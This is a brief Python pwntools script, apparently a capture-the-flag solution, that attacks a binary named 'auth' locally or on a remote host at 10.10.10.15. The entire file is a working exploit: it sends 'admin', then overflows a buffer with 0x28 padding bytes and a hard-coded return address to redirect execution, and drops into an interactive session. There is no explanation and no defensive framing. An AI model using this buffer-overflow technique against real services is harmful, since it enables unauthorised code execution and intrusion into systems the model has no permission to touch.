from pwn import *
elf_file = FILENAME = './auth'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log


HOST = '10.10.10.15'
POST = 1001
#libc = ELF("./libc.so.6")


if len(sys.argv) > 1 and sys.argv[1] == 'r':
  c = remote(HOST, POST)
else:
  #c = process(FILENAME)
  c = gdb.debug(FILENAME,gdbscript='''b *main+169''')

pad = 'A'*0x28
c.sendline('admin')
payload = pad + p64(0x401329)
c.sendline(payload)
c.interactive()